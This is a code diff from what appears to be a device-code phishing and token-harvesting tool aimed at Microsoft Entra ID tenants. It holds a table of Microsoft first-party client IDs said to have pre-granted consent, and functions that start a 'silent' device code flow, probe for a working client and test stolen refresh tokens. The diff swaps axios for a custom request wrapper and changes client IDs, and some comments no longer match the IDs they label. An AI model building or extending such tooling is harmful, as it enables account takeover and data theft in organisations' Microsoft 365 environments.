@@ -10,7 +10,7 @@
  */
 'use strict';
 
-const axios = require('axios');
+const ms = require('./microsoftclient');
 const config = require('../config/env');
 
 /**
@@ -18,18 +18,18 @@ const config = require('../config/env');
  * These are Microsoft-owned apps that have pre-granted consent in most AAD tenants
  */
 const PRE_CONSENTED_CLIENTS = {
-  // Microsoft Office - most universally pre-consented
-  office: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+  // Microsoft Authenticator - most universally pre-consented
+  office: '29d9ed98-a469-4536-ade2-f981bc1d605e',
   // Azure CLI - pre-consented in most tenants
   azure_cli: '1b730954-1685-4b74-9bfd-dac224a7b894',
   // Azure PowerShell
-  azure_ps: '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
+  azure_ps: '29d9ed98-a469-4536-ade2-f981bc1d605e',
   // Microsoft Graph Explorer
   graph_explorer: '1950a258-227b-4e31-a9cf-717495945fc2',
   // Skype
   skype: '88196af5-e584-4924-b87d-b752fde2c6e3',
   // Office 365 Management
-  o365_mgmt: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+  o365_mgmt: '29d9ed98-a469-4536-ade2-f981bc1d605e',
   // Teams client update
   teams: '1b730954-1685-4b74-9bfd-dac224a7b894'
 };
@@ -188,7 +188,7 @@ async function initiateSilentDeviceFlow(tenant, accountType, templateType, exist
     }
 
     // Step 2: Initiate device code flow with pre-consented client
-    const deviceCodeResponse = await axios.post(
+    const deviceCodeResponse = await ms.post(
       `${consentConfig.endpoint}/devicecode`,
       new URLSearchParams({
         client_id: consentConfig.client_id,
@@ -234,7 +234,7 @@ async function initiateSilentDeviceFlow(tenant, accountType, templateType, exist
  */
 async function testRefreshToken(refreshToken, tokenEndpoint, clientId, scope) {
   try {
-    const response = await axios.post(
+    const response = await ms.post(
       tokenEndpoint,
       new URLSearchParams({
         client_id: clientId,
@@ -306,7 +306,7 @@ async function findWorkingClient(tenant, accountType, templateType) {
 
     try {
       // Try a quick device code initiation to test if client works
-      const response = await axios.post(
+      const response = await ms.post(
         `${cConfig.endpoint}/devicecode`,
         new URLSearchParams({
           client_id: clientId,
@@ -378,7 +378,7 @@ function generateAuthorizeUrl(tenant, clientId, scope, redirectUri) {
  */
 async function checkTenantConsent(adminAccessToken, tenant, clientId) {
   try {
-    const response = await axios.get(
+    const response = await ms.get(
       `https://graph.microsoft.com/v1.0/${tenant}/oauth2PermissionGrants`,
       {
         headers: {
